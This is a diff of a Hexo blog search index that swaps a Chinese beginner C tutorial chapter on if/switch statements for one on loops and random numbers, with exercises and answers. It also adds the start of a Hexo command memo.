@@ -1,132 +1,140 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2. 流程控制(选择结构)</title>
-    <url>/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/</url>
-    <content><![CDATA[<h1 id="第二章：流程控制-选择结构"><a href="#第二章：流程控制-选择结构" class="headerlink" title="第二章：流程控制 (选择结构) "></a>第二章：流程控制 (选择结构) </h1><p><strong>本章核心：</strong> 让程序学会“思考”和“做决定”（如果…就…，否则…）。</p>
+    <title>3. 流程控制 (循环结构)</title>
+    <url>/2025/12/12/3-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<h1 id="第三章：流程控制-循环结构"><a href="#第三章：流程控制-循环结构" class="headerlink" title="第三章：流程控制 (循环结构)"></a>第三章：流程控制 (循环结构)</h1><p><strong>本章核心：</strong> 让程序学会“重复做某事”（转圈圈）。</p>
 <hr>
-<h2 id="1-关系运算符与逻辑运算符"><a href="#1-关系运算符与逻辑运算符" class="headerlink" title="1. 关系运算符与逻辑运算符"></a>1. 关系运算符与逻辑运算符</h2><p>判断语句基于关系运算符（例如 <code>&gt;</code>、<code>==</code>）的结果（真或假）。</p>
-<h3 id="1-1-关系运算符"><a href="#1-1-关系运算符" class="headerlink" title="1.1 关系运算符"></a>1.1 关系运算符</h3><p><code>==</code> (等于), <code>!=</code> (不等于), <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>。</p>
-<h3 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2 逻辑运算符"></a>1.2 逻辑运算符</h3><p><code>&amp;&amp;</code> (与), <code>||</code> (或), <code>!</code> (非)。</p>
-<p><strong>补充考点：</strong></p>
+<h2 id="1-for-循环"><a href="#1-for-循环" class="headerlink" title="1. for 循环"></a>1. <code>for</code> 循环</h2><p>适用于<strong>已知循环次数</strong>的情况。这是最常用的循环。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化; 条件判断; 步进) &#123;</span><br><span class="line">    <span class="comment">// 循环体代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><p><strong>数学写法 vs C 语言写法</strong>：</p>
-<ul>
-<li><p>数学里写：$0 &lt; x &lt; 10$</p>
+<li><p><strong>初始化</strong>：循环开始前执行一次（如 <code>int i = 0</code>）。</p>
 </li>
-<li><p>C 语言<strong>必须</strong>写成：<code>(x &gt; 0) &amp;&amp; (x &lt; 10)</code></p>
+<li><p><strong>条件判断</strong>：每次循环前检查，如果为真就继续，为假就停止（如 <code>i &lt; 10</code>）。</p>
 </li>
-</ul>
-</li>
-<li><p><strong>优先级</strong>：</p>
-<ul>
-<li><code>!</code> (最高) &gt; 算术运算符 &gt; 关系运算符 &gt; <code>&amp;&amp;</code> &gt; <code>||</code> (最低)。</li>
-</ul>
+<li><p><strong>步进</strong>：每次循环结束后执行（如 <code>i++</code>，表示 i 加 1）。</p>
 </li>
 </ul>
 <hr>
-<h3 id="习题-1-对应：关系与逻辑运算"><a href="#习题-1-对应：关系与逻辑运算" class="headerlink" title="习题 1 (对应：关系与逻辑运算)"></a>习题 1 (对应：关系与逻辑运算)</h3><p><strong>题目：</strong> 编写代码判断输入的三个整数 a, b, c 能否构成三角形。</p>
-<p><strong>构成三角形的条件：</strong> 任意两边之和大于第三边。</p>
-<p><strong>要求：</strong> 使用逻辑与运算符 <code>&amp;&amp;</code> 连接三个条件。</p>
-<p><strong>预期输出结果：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入三边: 3 4 5</span><br><span class="line">可以构成三角形</span><br></pre></td></tr></table></figure>
-
-<p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入三边: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须三个条件同时满足，所以用 &amp;&amp;</span></span><br><span class="line">    <span class="keyword">if</span> ((a + b &gt; c) &amp;&amp; (a + c &gt; b) &amp;&amp; (b + c &gt; a)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;可以构成三角形\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法构成三角形\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>易错：</strong></p>
-<ol>
-<li><p>将 <code>a+b&gt;c</code> 等条件用 <code>||</code> 连接（变成了“只要有一组边满足就行”，逻辑错误）。</p>
-</li>
-<li><p>试图写成数学连写形式 <code>a+b&gt;c&gt;...</code> (C 语言不支持)。</p>
-</li>
-</ol>
-<hr>
-<h2 id="2-if-else-结构"><a href="#2-if-else-结构" class="headerlink" title="2. if-else 结构"></a>2. <code>if-else</code> 结构</h2><p>用于根据条件的真假执行不同的代码块。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件表达式) &#123;</span><br><span class="line">    <span class="comment">// 1. 如果条件为真 (非0)，执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 如果条件为假 (0)，执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>示例：</strong> 判断一个数是否为正数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">-5</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;是正数\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;不是正数\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 不是正数</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>补充考点 (悬挂 else)：</strong></p>
-<p>当有多个 if 和 else 嵌套时，C 语言规定：else 总是与它上面最近的、未配对的 if 配对。</p>
-<ul>
-<li><strong>建议</strong>：无论只有一行代码还是多行，永远加上 <code>{ }</code>，防止逻辑混乱。</li>
-</ul>
-<hr>
-<h2 id="3-多重条件-if-else-if-else"><a href="#3-多重条件-if-else-if-else" class="headerlink" title="3. 多重条件 (if-else if-else)"></a>3. 多重条件 (<code>if-else if-else</code>)</h2><p>用于处理多个互斥的条件判断。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件 <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 满足条件 1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件 <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 不满足条件 1，但满足条件 2</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 所有条件都不满足</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="习题-2"><a href="#习题-2" class="headerlink" title="习题 2"></a>习题 2</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>整数成绩 (<code>score</code>)</strong>，根据以下标准输出评定结果。</p>
+<h3 id="习题-1-对应：for-循环与累加器"><a href="#习题-1-对应：for-循环与累加器" class="headerlink" title="习题 1 (对应：for 循环与累加器)"></a>习题 1 (对应：for 循环与累加器)</h3><p><strong>题目：</strong> 编写程序，计算从 <strong>1 加到 100</strong> 的总和 ($1 + 2 + 3 + \dots + 100$)。</p>
 <p><strong>要求：</strong></p>
 <ol>
-<li><p>使用 <code>if-else if-else</code> 结构。</p>
+<li><p>必须使用 <strong><code>for</code> 循环</strong>。</p>
 </li>
-<li><p>成绩范围 0-100。</p>
-<ul>
-<li><p>$\ge 90$: A (优秀)</p>
-</li>
-<li><p>$\ge 70$ 且 $&lt; 90$: B (良好)</p>
-</li>
-<li><p>$&lt; 70$: C (及格线以下)</p>
-</li>
-</ul>
+<li><p>定义变量 <code>sum</code> 存储总和，<strong>必须初始化为 0</strong>。</p>
 </li>
 </ol>
 <p><strong>预期输出结果：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入您的成绩 (0-100): </span><br><span class="line">85</span><br><span class="line">评定结果: B (良好)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1到100的和是: 5050</span><br></pre></td></tr></table></figure>
 
 <p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入您的成绩 (0-100): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标准逻辑流：从高到低判断，代码更易读</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: A (优秀)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="comment">// 能走到这里，说明分数肯定小于 90，所以只需判断是否 &gt;= 70</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: B (良好)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 剩下的所有情况 (即小于 70)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: C (及格线以下)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// ⚠️ 易错点：累加器必须初始化为 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">        sum = sum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1到100的和是: %d\n&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>易错：</strong></p>
 <ol>
-<li><p>逻辑顺序混乱：如果先判断 <code>score &gt;= 70</code>，那么 95 分也会被判定为 B（因为 95 也大于 70）。</p>
+<li><p><code>sum</code> 忘记初始化（结果会是垃圾值）。</p>
 </li>
-<li><p>在 <code>else</code> 后面画蛇添足加条件（<code>else (score &lt; 70)</code> 是语法错误，<code>else</code> 后不能跟括号）。</p>
+<li><p>循环条件写错（如 <code>i &lt; 100</code> 会少加一个 100）。</p>
 </li>
 </ol>
 <hr>
-<h2 id="4-switch-case-结构"><a href="#4-switch-case-结构" class="headerlink" title="4. switch-case 结构"></a>4. <code>switch-case</code> 结构</h2><p>适用于<strong>一个变量</strong>的取值，需要执行<strong>多分支选择</strong>的情况。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (变量/表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">1</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 必须要有！</span></span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 如果所有 case 都不匹配，则执行 default</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="2-while-循环"><a href="#2-while-循环" class="headerlink" title="2. while 循环"></a>2. <code>while</code> 循环</h2><p> 适用于<strong>不知道具体次数，只知道停止条件</strong>的情况。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件为真) &#123;</span><br><span class="line">    <span class="comment">// 只要条件成立，就一直做</span></span><br><span class="line">    <span class="comment">// 注意：必须在内部改变条件变量，否则会死循环！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>重点提醒 ：</strong></p>
-<p><strong>易错点：</strong> switch 语句中 break 的使用</p>
+<p><strong>补充考点 (C 语言真假法则)：</strong> C 语言没有 <code>true</code>&#x2F;<code>false</code> 关键字（C89标准）。</p>
 <ul>
-<li><strong>陷阱：</strong> 如果一个 <code>case</code> 分支中<strong>没有 <code>break</code></strong>，程序会继续执行下一个 <code>case</code> 分支的代码，直到遇到 <code>break</code> 或 <code>switch</code> 结束。这通常被称为<strong>穿透 (fall-through)</strong>，是初学者最常犯的逻辑错误。</li>
-</ul>
-<p><strong>补充考点 (类型限制)：</strong> switch 括号里的变量，以及 case 后面的值，必须是整数 (int) 或字符 (char)。</p>
-<ul>
-<li><p><strong>错误</strong>：<code>case 3.14:</code> (不能用浮点数)</p>
+<li><p><strong>0</strong> 是 <strong>假</strong>。</p>
 </li>
-<li><p><strong>错误</strong>：<code>case &quot;A&quot;:</code> (不能用字符串，字符用单引号 <code>&#39;A&#39;</code>)</p>
+<li><p><strong>非 0</strong> 都是 <strong>真</strong>。</p>
+</li>
+<li><p><code>while(1)</code> 是死循环，<code>while(0)</code> 永远不执行。</p>
 </li>
 </ul>
 <hr>
-<h3 id="习题-3"><a href="#习题-3" class="headerlink" title="习题 3"></a>习题 3</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>星期数 (1-7 之间的整数 <code>day</code>)</strong>，输出对应的星期名称（Monday, Tuesday… Sunday）。如果输入其他数字，输出 “Error”。</p>
-<p><strong>要求：</strong></p>
-<ol>
-<li><p>必须使用 <strong><code>switch-case</code></strong> 结构。</p>
+<h3 id="习题-2-对应：while-循环与逻辑判断"><a href="#习题-2-对应：while-循环与逻辑判断" class="headerlink" title="习题 2 (对应：while 循环与逻辑判断)"></a>习题 2 (对应：while 循环与逻辑判断)</h3><p><strong>(源自你的笔记 task 2.2 猜数字基础版)</strong></p>
+<p><strong>题目：</strong> 预设一个数字 <code>target = 66</code>，让用户不断输入数字去猜。</p>
+<ul>
+<li><p>猜大了提示“太大了”。</p>
 </li>
-<li><p><strong>易错点：</strong> 每一个 <code>case</code> 结束时必须有 <strong><code>break;</code></strong>。</p>
+<li><p>猜小了提示“太小了”。</p>
 </li>
-<li><p><strong>默认处理：</strong> 使用 <code>default:</code> 处理非 1-7 的输入。</p>
+<li><p>猜中了提示“恭喜”并结束。</p>
 </li>
-</ol>
+</ul>
+<p><strong>要求：</strong> 使用 <code>while(1)</code> 配合 <code>break</code> 语句来实现。</p>
 <p><strong>预期输出结果：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入星期数 (1-7): </span><br><span class="line">3</span><br><span class="line">星期三</span><br></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">猜猜我是谁(0-100): 50</span><br><span class="line">太小了</span><br><span class="line">猜猜我是谁(0-100): 66</span><br><span class="line">恭喜猜中！</span><br></pre></td></tr></table></figure>
 
 <p><strong>答案：</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> day; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入星期数 (1-7):\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;day);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// ✅ 必须有 break，防止穿透</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期四\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期五\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期六\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期日\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 处理所有非 1-7 的情况</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误，请输入1到7之间的数字。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> target = <span class="number">66</span>;</span><br><span class="line">    <span class="type">int</span> guess;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// 死循环</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;猜猜我是谁(0-100): \n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;guess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (guess &gt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太大了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (guess &lt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太小了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜猜中！\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// ✋ 核心：猜中后跳出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>易错：</strong></p>
 <ol>
-<li><p>漏写 <code>break;</code> 导致程序打印出多天的名字。</p>
+<li><p><code>while</code> 后面忘记加大括号 <code>{}</code>。</p>
 </li>
-<li><p><code>switch</code> 后面的括号里不需要分号 <code>;</code>。</p>
+<li><p>在死循环中忘记写 <code>break</code> 导致程序无法结束。</p>
 </li>
-<li><p><code>default</code> 拼写错误。</p>
+</ol>
+<hr>
+<h2 id="3-do-while-循环-导师补充"><a href="#3-do-while-循环-导师补充" class="headerlink" title="3. do-while 循环 (导师补充)"></a>3. <code>do-while</code> 循环 (导师补充)</h2><p><strong>(考点补充)</strong> 这是一个<strong>至少执行一次</strong>的循环。</p>
+<ul>
+<li><p>先干活，后判断。</p>
+</li>
+<li><p><strong>试卷考点</strong>：试卷 <strong>005.jpg</strong> 编程题第 3 题就用到了 <code>do-while</code> 结构。</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 先执行这里</span></span><br><span class="line">&#125; <span class="keyword">while</span> (条件); <span class="comment">//注意：这里必须有分号！</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-循环控制：break-与-continue"><a href="#4-循环控制：break-与-continue" class="headerlink" title="4. 循环控制：break 与 continue"></a>4. 循环控制：<code>break</code> 与 <code>continue</code></h2><p>这是选择题必考点：</p>
+<ol>
+<li><p><strong><code>break</code></strong>：<strong>彻底跳出</strong>循环（不干了，直接辞职）。</p>
+</li>
+<li><p><strong><code>continue</code></strong>：<strong>跳过本次</strong>循环剩余部分，直接进入下一次循环（今天请假，明天继续）。</p>
+</li>
+</ol>
+<h3 id="习题-3-对应：break-vs-continue"><a href="#习题-3-对应：break-vs-continue" class="headerlink" title="习题 3 (对应：break vs continue)"></a>习题 3 (对应：break vs continue)</h3><p><strong>题目：</strong> 编写一个 <code>for</code> 循环从 1 输出到 5，但是：</p>
+<ol>
+<li><p>遇到 3 时，使用 <code>continue</code>。</p>
+</li>
+<li><p>（注释掉代码后）改为遇到 3 时，使用 break。<br>观察输出区别。</p>
+</li>
+</ol>
+<p><strong>答案：</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况 1: continue</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 1 2 4 5 (跳过了 3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况 2: break</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 1 2 (遇到 3 直接结束)</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5-随机数生成-Random-Numbers"><a href="#5-随机数生成-Random-Numbers" class="headerlink" title="5. 随机数生成 (Random Numbers)"></a>5. 随机数生成 (Random Numbers)</h2><p>这是一个进阶考点，通常用于游戏开发或模拟题。</p>
+<h3 id="三步走战略"><a href="#三步走战略" class="headerlink" title="三步走战略"></a>三步走战略</h3><ol>
+<li><p><strong>头文件</strong>：<code>#include &lt;stdlib.h&gt;</code> 和 <code>#include &lt;time.h&gt;</code>。</p>
+</li>
+<li><p><strong>播种</strong>：<code>srand(time(NULL));</code> (在 <code>main</code> 开头写一次)。</p>
+</li>
+<li><p><strong>生成</strong>：<code>rand() % N</code> (生成 0 到 N-1 的数)。</p>
+</li>
+</ol>
+<p><strong>万能公式：</strong> 生成 [min, max] 之间的随机数：rand() % (max - min + 1) + min</p>
+<hr>
+<h3 id="习题-4-对应：随机数生成"><a href="#习题-4-对应：随机数生成" class="headerlink" title="习题 4 (对应：随机数生成)"></a>习题 4 (对应：随机数生成)</h3><p><strong>题目：</strong> 编写一个“真·猜数字”游戏。</p>
+<ol>
+<li><p>程序随机生成一个 <strong>1 到 100</strong> 之间的数字作为目标。</p>
+</li>
+<li><p>用户循环猜测，直到猜中。</p>
+</li>
+</ol>
+<p><strong>要求：</strong> 必须正确包含头文件和播种代码。</p>
+<p><strong>预期输出结果：</strong> (每次运行的目标数字应不同)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(假设随机到了 42)</span><br><span class="line">猜数: 50 -&gt; 太大了</span><br><span class="line">猜数: 42 -&gt; 恭喜猜中!</span><br></pre></td></tr></table></figure>
+
+<p><strong>答案：</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// 必须</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span>   <span class="comment">// 必须</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); <span class="comment">// 1. 播种</span></span><br><span class="line">    <span class="type">int</span> target = rand() % <span class="number">100</span> + <span class="number">1</span>; <span class="comment">// 2. 生成 1-100</span></span><br><span class="line">    <span class="type">int</span> guess;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;猜数: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;guess);</span><br><span class="line">        <span class="keyword">if</span> (guess == target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜猜中!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (guess &gt; target) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太大了\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;太小了\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>易错：</strong></p>
+<ol>
+<li><p>忘记写 <code>srand</code>，导致每次运行生成的随机数一样。</p>
+</li>
+<li><p>取余公式写错，生成了 0 到 99 而不是 1 到 100。</p>
 </li>
 </ol>
 ]]></content>
@@ -136,6 +144,39 @@
       </categories>
       <tags>
         <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo命令与配置备忘录</title>
+    <url>/2025/12/09/Hexo%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[<blockquote>
+<p>这是一篇写给我自己的备忘录，记录了博客日常维护、写文章和修改配置的常用命令。</p>
+</blockquote>
+<h2 id="常用命令速查"><a href="#常用命令速查" class="headerlink" title="常用命令速查"></a>常用命令速查</h2><p>在终端进入博客目录 <code>~/Hello_CTF/my_ctf_blog</code> 后使用。</p>
+<h3 id="1-发布博客"><a href="#1-发布博客" class="headerlink" title="1. 发布博客"></a>1. 发布博客</h3><ol>
+<li><p>创建新的markdown文件：</p>
+ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;新的wp&quot;</span></span><br></pre></td></tr></table></figure>
+<p> 然后目录出现<code>新的wp.md</code></p>
+</li>
+<li><p>根据自身要求修改文件属性：</p>
